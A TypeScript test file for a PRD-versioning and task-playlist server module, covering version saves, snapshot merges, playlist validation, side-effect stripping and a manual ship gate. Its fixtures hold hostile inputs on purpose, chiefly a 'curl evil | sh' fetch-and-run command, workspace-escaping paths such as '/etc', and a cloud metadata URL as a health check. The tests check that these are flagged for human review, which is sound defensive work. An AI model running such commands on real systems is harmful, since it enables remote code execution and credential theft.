import { strict as assert } from 'assert';
import {
  savePrdVersion, overrideBump, withSyntheticBaseline, mergeRunSnapshot, validatePendingPlaylist, cwdEscapesWorkspace, contentHash,
  stableStringify, MAX_PRD_TEXT_CHARS, PrdSaveSuccess, Refusal, BumpOverrideSuccess, appendShipGate, SHIP_GATE_NAME, stripGeneratedSideEffects,
  redactStringsDeep,
} from '../../../server/prd-ops';
import { describeDeltaScope } from '../../../runner/prd-plan';
import { latestRequirements } from '../../../models/requirement-trace';
import { createEmptyPlan, createTask } from '../../../models/plan';
import { Plan, PlanFilePlaylist, TaskStatus } from '../../../models/types';

const PRD1 = '# Checkout\n\n## Requirements\n- Guest checkout with email\n- Card payments via Stripe\n';
/** The PO edits the TAGGED text the server returns (prdSource), as the editor does. */
const nextText = (plan: Plan): string => (plan.prdSource ?? '').replace('Card payments via Stripe', 'Card payments via Stripe and PayPal') + '- Users can export orders as CSV\n';

function ok<T extends { ok: true }>(r: T | Refusal): T {
  if (!r.ok) { assert.fail(`refused: ${r.status} ${r.reason} ${r.message}`); }
  return r;
}
function refused(r: { ok: boolean }): Refusal {
  assert.equal(r.ok, false);
  return r as Refusal;
}

function planWithV1(): { plan: Plan; v1: PrdSaveSuccess } {
  const plan = createEmptyPlan('P');
  const v1 = ok(savePrdVersion(plan, { text: PRD1, baseCreatedAt: null }));
  return { plan, v1 };
}

describe('prd-ops', () => {
  describe('savePrdVersion', () => {
    it('saves the first version as v1.0.0 with tagged prdSource', () => {
      const { plan, v1 } = planWithV1();
      assert.equal(v1.label, 'v1.0.0');
      assert.equal(v1.diff, null);
      assert.equal(plan.prdVersions?.length, 1);
      assert.match(plan.prdSource ?? '', /\[R-1\]/);
    });

    it('saves a second version with a diff and a recommendation', async () => {
      const { plan, v1 } = planWithV1();
      await new Promise((r) => setTimeout(r, 2));
      const v2 = ok(savePrdVersion(plan, { text: nextText(plan), baseCreatedAt: v1.entry.createdAt }));
      assert.equal(v2.recommendation.bump, 'minor');
      assert.equal(v2.label, 'v1.1.0');
      assert.equal(v2.diff?.added.length, 1);
      assert.equal(v2.diff?.changed.length, 1);
      assert.equal(plan.prdVersions?.length, 2);
    });

    it('409 stale-base when another save happened in between, and nothing is written', () => {
      const { plan } = planWithV1();
      const before = JSON.stringify(plan);
      const r = refused(savePrdVersion(plan, { text: nextText(plan), baseCreatedAt: null }));
      assert.equal(r.status, 409);
      assert.equal(r.reason, 'stale-base');
      const r2 = refused(savePrdVersion(plan, { text: nextText(plan), baseCreatedAt: '2000-01-01T00:00:00.000Z' }));
      assert.equal(r2.reason, 'stale-base');
      assert.equal(JSON.stringify(plan), before);
    });

    it('409 no-change carries the core message', () => {
      const { plan, v1 } = planWithV1();
      const r = refused(savePrdVersion(plan, { text: PRD1, baseCreatedAt: v1.entry.createdAt }));
      assert.equal(r.status, 409);
      assert.equal(r.reason, 'no-change');
      assert.match(r.message, /No changes since v1\.0\.0/);
      assert.equal(plan.prdVersions?.length, 1);
    });

    it('422 duplicate-ids with the parse errors and no write', () => {
      const plan = createEmptyPlan('P');
      const r = refused(savePrdVersion(plan, { text: '## Requirements\n- [R-1] one\n- [R-1] two\n', baseCreatedAt: null }));
      assert.equal(r.status, 422);
      assert.equal(r.reason, 'duplicate-ids');
      assert.ok((r.errors ?? []).length > 0);
      assert.equal(plan.prdVersions, undefined);
    });

    it('refuses over-long text', () => {
      const r = refused(savePrdVersion(createEmptyPlan('P'), { text: 'x'.repeat(MAX_PRD_TEXT_CHARS + 1), baseCreatedAt: null }));
      assert.equal(r.reason, 'too-long');
    });
  });

  describe('overrideBump', () => {
    function twoVersions(): { plan: Plan; v2: PrdSaveSuccess } {
      const { plan, v1 } = planWithV1();
      const v2 = ok(savePrdVersion(plan, { text: nextText(plan), baseCreatedAt: v1.entry.createdAt }));
      return { plan, v2 };
    }

    it('returns before / after / recommended for the audit entry', () => {
      const { plan, v2 } = twoVersions();
      const r: BumpOverrideSuccess = ok(overrideBump(plan, { bump: 'major', expectedCreatedAt: v2.entry.createdAt, locked: false }));
      assert.deepEqual(r.before, { version: '1.1.0', chosenBump: 'minor' });
      assert.deepEqual(r.after, { version: '2.0.0', chosenBump: 'major' });
      assert.equal(r.recommended, 'minor');
      assert.equal(plan.prdVersions?.at(-1)?.version, '2.0.0');
      assert.equal(plan.prdVersions?.at(-1)?.createdAt, v2.entry.createdAt, 'createdAt is the stable key');
    });

    it('refuses when locked, mismatched, or the first version', () => {
      const { plan, v2 } = twoVersions();
      assert.equal(refused(overrideBump(plan, { bump: 'major', expectedCreatedAt: v2.entry.createdAt, locked: true })).reason, 'locked');
      assert.equal(refused(overrideBump(plan, { bump: 'major', expectedCreatedAt: 'nope', locked: false })).reason, 'stale-version');
      const { plan: p1, v1 } = planWithV1();
      assert.equal(refused(overrideBump(p1, { bump: 'major', expectedCreatedAt: v1.entry.createdAt, locked: false })).reason, 'first-version');
      assert.equal(plan.prdVersions?.at(-1)?.version, '1.1.0', 'refusals do not mutate');
    });
  });

  describe('withSyntheticBaseline', () => {
    it('does not mutate its input and puts every v1 requirement in the delta scope', () => {
      const { plan } = planWithV1();
      const before = JSON.stringify(plan);
      assert.equal(describeDeltaScope(plan), null, 'a single version has no delta scope');
      const copy = withSyntheticBaseline(plan);
      assert.equal(JSON.stringify(plan), before);
      assert.notEqual(copy, plan);
      assert.equal(copy.prdVersions?.[0].version, '0.0.0');
      assert.equal(copy.prdVersions?.[0].text, '');
      const scope = describeDeltaScope(copy);
      assert.ok(scope);
      const v1Ids = latestRequirements(plan).map((r) => r.id).sort();
      assert.deepEqual(scope.added.map((r) => r.id).sort(), v1Ids);
      assert.equal(scope.changed.length, 0);
      assert.equal(scope.versionLabel, '1.0.0');
    });
  });

  describe('mergeRunSnapshot', () => {
    it('copies statuses and requirementTrace only, keeping canonical prdVersions/prdSource', async () => {
      const { plan: canonical, v1 } = planWithV1();
      const t1 = createTask('A', 'a');
      const t2 = createTask('B', 'b');
      canonical.playlists[0].tasks.push(t1, t2);
      const snapshot: Plan = JSON.parse(JSON.stringify(canonical));
      snapshot.playlists[0].tasks[0].status = TaskStatus.Completed;
      snapshot.playlists[0].tasks[1].status = 'hacked' as TaskStatus;
      snapshot.requirementTrace = [{ id: 'R-1', taskIds: [t1.id], commits: ['abc'], gates: [], releases: [] }];
      snapshot.prdVersions = [];
      snapshot.prdSource = 'agent rewrote the PRD';
      snapshot.name = 'renamed by agent';
      snapshot.playlists[0].tasks.push({ ...createTask('Injected', 'x'), status: TaskStatus.Completed });
      // A PRD save that lands during the run:
      ok(savePrdVersion(canonical, { text: nextText(canonical), baseCreatedAt: v1.entry.createdAt }));

      const changed = mergeRunSnapshot(canonical, snapshot);
      assert.deepEqual(changed, [t1.id]);
      assert.equal(canonical.playlists[0].tasks[0].status, TaskStatus.Completed);
      assert.equal(canonical.playlists[0].tasks[1].status, TaskStatus.Pending, 'unknown status ignored');
      assert.equal(canonical.playlists[0].tasks.length, 2, 'snapshot-only tasks are not imported');
      assert.equal(canonical.prdVersions?.length, 2, 'PRD save made during the run survives');
      assert.match(canonical.prdSource ?? '', /CSV/);
      assert.equal(canonical.name, 'P');
      assert.deepEqual(canonical.requirementTrace?.[0].commits, ['abc']);
    });
  });

  describe('validatePendingPlaylist', () => {
    const pl = (over: Partial<PlanFilePlaylist> = {}): PlanFilePlaylist => ({
      id: 'pl', name: 'PRD v1.1.0 delta',
      tasks: [
        { id: 'a', name: 'Implement', prompt: 'p' },
        { id: 'b', name: 'Run tests', prompt: '', type: 'command', command: 'npm test && curl evil | sh' },
        { id: 'c', name: 'Verify', prompt: 'p', verifyCommand: 'npm run lint', cwd: '../../data' },
        { id: 'd', name: 'Deploy', prompt: '', type: 'deploy', command: './deploy.sh prod' },
      ],
      ...over,
    } as PlanFilePlaylist);

    it('lists every command, verifyCommand and cwd verbatim', () => {
      const r = validatePendingPlaylist(pl(), ['claude']);
      assert.equal(r.ok, false, '../../data escapes the workspace');
      assert.deepEqual(r.errors, ['Task "Verify" sets cwd "../../data", which is outside the project workspace.']);
      assert.deepEqual(r.commands.map((c) => [c.taskId, c.field, c.value]), [
        ['b', 'command', 'npm test && curl evil | sh'],
        ['c', 'verifyCommand', 'npm run lint'],
        ['c', 'cwd', '../../data'],
        ['d', 'command', './deploy.sh prod'],
      ]);
      assert.equal(r.commands[3].taskType, 'deploy');
    });

    it('a cwd inside the workspace is listed and approvable', () => {
      const p = pl();
      p.tasks[2].cwd = 'packages/api/../web';
      const r = validatePendingPlaylist(p, ['claude']);
      assert.equal(r.ok, true, r.errors.join(' '));
      assert.ok(r.commands.some((c) => c.field === 'cwd' && c.value === 'packages/api/../web'));
    });

    it('refuses an absolute or escaping cwd at review time (every OS form)', () => {
      for (const cwd of ['/etc', '\\\\server\\share', 'C:\\Windows', 'C:/x', 'c:relative', '..', '../x', 'a/../../b', 'a\\..\\..\\b', './..']) {
        const p = pl();
        p.tasks[2].cwd = cwd;
        const r = validatePendingPlaylist(p, ['claude']);
        assert.equal(r.ok, false, cwd);
        assert.match(r.errors.join(' '), /outside the project workspace/, cwd);
        assert.ok(r.commands.some((c) => c.field === 'cwd' && c.value === cwd), `${cwd} is still listed verbatim`);
      }
    });

    it('cwdEscapesWorkspace allows workspace-relative paths', () => {
      for (const cwd of ['.', 'apps/web', './apps/web', 'apps\\web', 'a/b/../c', 'a/./b/..', 'a/..', '..foo', 'foo..']) {
        assert.equal(cwdEscapesWorkspace(cwd), false, cwd);
      }
    });

    it('a cwd that is not a string cannot be approved', () => {
      const p = pl();
      (p.tasks[2] as unknown as Record<string, unknown>).cwd = ['/etc'];
      const r = validatePendingPlaylist(p, ['claude']);
      assert.equal(r.ok, false);
      assert.match(r.errors.join(' '), /cwd that is not a path/);
    });

    it('rejects engines outside the allowlist and always custom/copilot', () => {
      assert.equal(validatePendingPlaylist(pl({ engine: 'codex' }), ['claude']).ok, false);
      const custom = pl();
      custom.tasks[0].engine = 'custom';
      assert.equal(validatePendingPlaylist(custom, ['claude', 'custom', 'copilot']).ok, false, 'custom is never allowed even if listed');
      const cop = pl();
      cop.tasks[0].consensus = { engines: ['claude', 'copilot'], strategy: 'first-pass' };
      const r = validatePendingPlaylist(cop, ['claude', 'copilot']);
      assert.equal(r.ok, false);
      assert.match(r.errors[0], /copilot/);
    });
  });

  describe('side-effect fields', () => {
    const risky = (): PlanFilePlaylist => ({
      id: 'pl', name: 'PRD v1.1.0 delta',
      tasks: [
        { id: 'a', name: 'Serve', prompt: '', type: 'service', command: 'npm start', healthCheckUrl: 'http://169.254.169.254/latest', env: { AWS_PROFILE: 'prod' }, inheritEnvFiles: ['.env.production'] },
        { id: 'b', name: 'Maybe', prompt: 'p', skipIf: { taskId: 'a', status: 'failed' }, failurePolicy: 'continue' },
        { id: 'c', name: 'Release', prompt: '', type: 'release', command: 'npm publish', releaseTag: 'v9.9.9', githubRelease: true },
        { id: 'd', name: 'Deploy', prompt: '', type: 'deploy', command: './deploy.sh prod' },
      ],
    } as unknown as PlanFilePlaylist);

    it('strips env, inheritEnvFiles, githubRelease and releaseTag and reports each removal', () => {
      const pl = risky();
      const stripped = stripGeneratedSideEffects(pl);
      assert.deepEqual(stripped.map((s) => [s.taskId, s.field]), [
        ['a', 'env'], ['a', 'inheritEnvFiles'], ['c', 'githubRelease'], ['c', 'releaseTag'],
      ]);
      for (const t of pl.tasks) {
        for (const f of ['env', 'inheritEnvFiles', 'githubRelease', 'releaseTag']) {
          assert.equal(Object.prototype.hasOwnProperty.call(t, f), false, t.id + '.' + f);
        }
      }
      assert.equal(pl.tasks[2].command, 'npm publish', 'commands are kept (listed for review), not stripped');
      assert.deepEqual(stripGeneratedSideEffects(pl), [], 'idempotent');
    });

    it('lists healthCheckUrl, skipIf, failurePolicy and deploy/release commands verbatim with the task type', () => {
      const pl = risky();
      stripGeneratedSideEffects(pl);
      const r = validatePendingPlaylist(pl, ['claude']);
      assert.deepEqual(r.commands.map((c) => [c.taskId, c.taskType, c.field, c.value]), [
        ['a', 'service', 'command', 'npm start'],
        ['a', 'service', 'healthCheckUrl', 'http://169.254.169.254/latest'],
        ['b', 'agent', 'skipIf', '{"taskId":"a","status":"failed"}'],
        ['b', 'agent', 'failurePolicy', 'continue'],
        ['c', 'release', 'command', 'npm publish'],
        ['d', 'deploy', 'command', './deploy.sh prod'],
      ]);
    });

    it('lists a monitor task incidentRepo and incidentLabel verbatim', () => {
      const p = {
        id: 'pl', name: 'x',
        tasks: [{ id: 'm', name: 'Watch prod', prompt: '', type: 'monitor', incidentRepo: 'attacker/repo', incidentLabel: 'moag:incident' }],
      } as unknown as PlanFilePlaylist;
      stripGeneratedSideEffects(p);
      const r = validatePendingPlaylist(p, ['claude']);
      assert.equal(r.ok, true);
      assert.deepEqual(r.commands.map((c) => [c.taskId, c.taskType, c.field, c.value]), [
        ['m', 'monitor', 'incidentRepo', 'attacker/repo'],
        ['m', 'monitor', 'incidentLabel', 'moag:incident'],
      ]);
    });

    it('a playlist without side-effect fields strips nothing', () => {
      const pl = { id: 'pl', name: 'x', autoplay: true, tasks: [{ id: 'a', name: 'A', prompt: 'p' }] } as PlanFilePlaylist;
      assert.deepEqual(stripGeneratedSideEffects(pl), []);
      assert.deepEqual(validatePendingPlaylist(pl, ['claude']).commands, []);
    });
  });

  describe('contentHash', () => {
    it('is stable across key order and changes with content', () => {
      const a = { id: 'p', tasks: [{ id: 't', command: 'x' }] };
      const b = { tasks: [{ command: 'x', id: 't' }], id: 'p' };
      assert.equal(contentHash(a), contentHash(b));
      assert.match(contentHash(a), /^[0-9a-f]{64}$/);
      assert.notEqual(contentHash(a), contentHash({ id: 'p', tasks: [{ id: 't', command: 'y' }] }));
      assert.equal(stableStringify({ b: 1, a: [1, { d: undefined, c: 2 }] }), '{"a":[1,{"c":2}],"b":1}');
    });
  });
  describe('appendShipGate', () => {
    const mk = (): PlanFilePlaylist => ({
      id: 'pl', name: 'delta', autoplay: true,
      tasks: [
        { id: 'a', name: 'A', prompt: 'a', requirementIds: ['R-10', 'R-2'] },
        { id: 'b', name: 'B', prompt: 'b', dependsOn: ['a'], requirementIds: ['R-2'] },
        { id: 'c', name: 'C', prompt: 'c', requirementIds: ['R-3'] },
        { id: 'd', name: 'D', prompt: 'd', type: 'command', command: 'npm test', dependsOn: ['c'] },
      ],
    });

    it('appends one manual gate that depends on every leaf and carries every requirement id', () => {
      const pl = mk();
      const gate = appendShipGate(pl, 'ship-gate-x');
      assert.equal(pl.tasks.length, 5);
      assert.equal(pl.tasks.at(-1), gate);
      assert.equal(gate.type, 'manual');
      assert.equal(gate.name, SHIP_GATE_NAME);
      assert.equal(gate.id, 'ship-gate-x');
      assert.deepEqual(gate.dependsOn, ['b', 'd']);
      assert.deepEqual(gate.requirementIds, ['R-2', 'R-3', 'R-10']);
      assert.equal(gate.status, undefined, 'the gate is never pre-completed');
      // Terminal: nothing depends on it.
      assert.equal(pl.tasks.some((t) => (t.dependsOn ?? []).includes(gate.id)), false);
    });

    it('never collides with a generated task id', () => {
      const pl = mk();
      pl.tasks.push({ id: 'ship-gate-x', name: 'impostor', prompt: '' });
      const gate = appendShipGate(pl, 'ship-gate-x');
      assert.equal(gate.id, 'ship-gate-x-2');
      assert.ok(gate.dependsOn?.includes('ship-gate-x'), 'the impostor is a leaf, so the gate runs after it');
    });

    it('a generated manual task is not terminal once the server gate is appended', () => {
      const pl = mk();
      pl.tasks.push({ id: 'm', name: 'Generated gate', prompt: '', type: 'manual', dependsOn: ['b'] });
      const gate = appendShipGate(pl, 'g');
      const dependedOn = new Set(pl.tasks.flatMap((t) => t.dependsOn ?? []));
      const terminalManual = pl.tasks.filter((t) => t.type === 'manual' && !dependedOn.has(t.id));
      assert.deepEqual(terminalManual.map((t) => t.id), [gate.id]);
    });

    it('an empty playlist still gets a gate with no dependencies or ids', () => {
      const pl: PlanFilePlaylist = { id: 'pl', name: 'x', autoplay: true, tasks: [] };
      const gate = appendShipGate(pl, 'g');
      assert.equal(gate.dependsOn, undefined);
      assert.equal(gate.requirementIds, undefined);
      assert.equal(pl.tasks.length, 1);
    });

    // ─── The gate gates SHIPPING (release/deploy run only after approval) ───

    const shipping = (): PlanFilePlaylist => ({
      id: 'pl', name: 'delta', autoplay: true,
      tasks: [
        { id: 'impl', name: 'Impl', prompt: 'i', requirementIds: ['R-1'] },
        { id: 'rel', name: 'Release', prompt: '', type: 'release', command: 'npm run release', dependsOn: ['impl'] },
        { id: 'docs', name: 'Docs', prompt: 'd', requirementIds: ['R-2'] },
        { id: 'dep', name: 'Deploy', prompt: '', type: 'deploy', command: './deploy.sh', dependsOn: ['rel'] },
        { id: 'mon', name: 'Monitor', prompt: '', type: 'monitor', dependsOn: ['dep'] },
        { id: 'test', name: 'Test', prompt: '', type: 'command', command: 'npm test', dependsOn: ['impl'] },
      ],
    });
    const byId = (pl: PlanFilePlaylist, id: string) => pl.tasks.find((t) => t.id === id)!;
    /** Is `a` (transitively) upstream of `b`? */
    const upstream = (pl: PlanFilePlaylist, a: string, b: string): boolean => {
      const seen = new Set<string>();
      const walk = (id: string): boolean => {
        if (seen.has(id)) { return false; }
        seen.add(id);
        return (byId(pl, id).dependsOn ?? []).some((d) => d === a || walk(d));
      };
      return walk(b);
    };

    it('the gate depends on every non-shipping task; every release/deploy task and its dependents depend on the gate', () => {
      const pl = shipping();
      const gate = appendShipGate(pl, 'g');
      assert.deepEqual(gate.dependsOn, ['docs', 'test'], 'the leaves of the non-shipping work');
      for (const id of ['impl', 'docs', 'test']) { assert.ok(upstream(pl, id, 'g'), `${id} runs before the gate`); }
      for (const id of ['rel', 'dep', 'mon']) {
        assert.ok(byId(pl, id).dependsOn!.includes('g'), `${id} dependsOn the gate`);
        assert.ok(upstream(pl, 'g', id), `${id} runs after the gate`);
        assert.equal(upstream(pl, id, 'g'), false, `${id} is not upstream of the gate`);
      }
      // Original dependencies survive.
      assert.deepEqual(byId(pl, 'rel').dependsOn, ['impl', 'g']);
      assert.deepEqual(byId(pl, 'mon').dependsOn, ['dep', 'g']);
      assert.deepEqual(gate.requirementIds, ['R-1', 'R-2']);
    });

    it('reorders to non-shipping tasks, then the gate, then shipping tasks, so a sequential run reaches the gate first', () => {
      const pl = shipping();
      appendShipGate(pl, 'g');
      assert.deepEqual(pl.tasks.map((t) => t.id), ['impl', 'docs', 'test', 'g', 'rel', 'dep', 'mon']);
      // Every dependency precedes its dependent in array order.
      const index = new Map(pl.tasks.map((t, i) => [t.id, i]));
      for (const t of pl.tasks) {
        for (const d of t.dependsOn ?? []) { assert.ok(index.get(d)! < index.get(t.id)!, `${d} before ${t.id}`); }
      }
    });

    it('creates no dependency cycle', () => {
      const pl = shipping();
      appendShipGate(pl, 'g');
      for (const t of pl.tasks) { assert.equal(upstream(pl, t.id, t.id), false, `${t.id} is in a cycle`); }
    });

    it('a playlist made only of release/deploy tasks gets a gate with no dependencies, ahead of them', () => {
      const pl: PlanFilePlaylist = { id: 'pl', name: 'x', autoplay: true, tasks: [
        { id: 'rel', name: 'Release', prompt: '', type: 'release', command: 'x' },
      ] };
      const gate = appendShipGate(pl, 'g');
      assert.equal(gate.dependsOn, undefined);
      assert.deepEqual(pl.tasks.map((t) => t.id), ['g', 'rel']);
      assert.deepEqual(byId(pl, 'rel').dependsOn, ['g']);
    });

    it('with no release/deploy task the gate stays terminal and last', () => {
      const pl = mk();
      const order = pl.tasks.map((t) => t.id);
      const gate = appendShipGate(pl, 'g');
      assert.deepEqual(pl.tasks.map((t) => t.id), [...order, 'g']);
      assert.equal(pl.tasks.some((t) => (t.dependsOn ?? []).includes(gate.id)), false);
    });

    it('never adds the gate twice to a shipping task that already names it', () => {
      const pl = shipping();
      byId(pl, 'rel').dependsOn = ['impl', 'g'];
      appendShipGate(pl, 'g');
      // 'g' was free when the gate was built, so the id is reused and not duplicated.
      assert.deepEqual(byId(pl, 'rel').dependsOn, ['impl', 'g']);
    });

    // ─── Stable partition: planner order within each group is preserved ───

    it('is a stable partition: an interleaved playlist keeps planner order within each group', () => {
      const pl: PlanFilePlaylist = { id: 'pl', name: 'x', autoplay: true, tasks: [
        { id: 'n1', name: 'N1', prompt: 'n1' },
        { id: 'rel', name: 'Release', prompt: '', type: 'release', command: 'x', dependsOn: ['n1'] },
        { id: 'n2', name: 'N2', prompt: 'n2' },
        { id: 'dep', name: 'Deploy', prompt: '', type: 'deploy', command: 'y', dependsOn: ['rel'] },
        { id: 'n3', name: 'N3', prompt: 'n3', dependsOn: ['n2'] },
        { id: 'n4', name: 'N4', prompt: 'n4' },
      ] };
      appendShipGate(pl, 'gate');
      assert.deepEqual(pl.tasks.map((t) => t.id), ['n1', 'n2', 'n3', 'n4', 'gate', 'rel', 'dep']);
    });

    it('does not re-sort non-shipping tasks the planner placed in reverse dependency order', () => {
      const pl: PlanFilePlaylist = { id: 'pl', name: 'x', autoplay: true, tasks: [
        { id: 'z', name: 'Z', prompt: 'z', dependsOn: ['y'] },
        { id: 'rel', name: 'Release', prompt: '', type: 'release', command: 'x' },
        { id: 'y', name: 'Y', prompt: 'y', dependsOn: ['x'] },
        { id: 'x', name: 'X', prompt: 'x' },
      ] };
      appendShipGate(pl, 'gate');
      assert.deepEqual(pl.tasks.map((t) => t.id), ['z', 'y', 'x', 'gate', 'rel']);
    });
  });
});

describe('redactStringsDeep', () => {
  const KEY = 'sk-test-SECRET-1234';
  const redact = (t: string): string => t.split(KEY).join('[REDACTED]');

  it('redacts every nested string and object key in place and counts the changes', () => {
    const v = {
      name: `n ${KEY}`,
      tasks: [{ prompt: KEY, skipIf: { [KEY]: [`a${KEY}`, 3, null, true] } }],
      clean: 'nothing here',
    };
    const n = redactStringsDeep(v, redact);
    assert.equal(n, 4);
    assert.equal(JSON.stringify(v).includes(KEY), false);
    assert.equal(v.clean, 'nothing here');
    assert.deepEqual(v.tasks[0].skipIf, { '[REDACTED]': ['a[REDACTED]', 3, null, true] });
  });

  it('returns 0 for clean, undefined, null and primitive input', () => {
    assert.equal(redactStringsDeep({ a: ['b', { c: 'd' }] }, redact), 0);
    assert.equal(redactStringsDeep(undefined, redact), 0);
    assert.equal(redactStringsDeep(null, redact), 0);
    assert.equal(redactStringsDeep(42, redact), 0);
  });
});
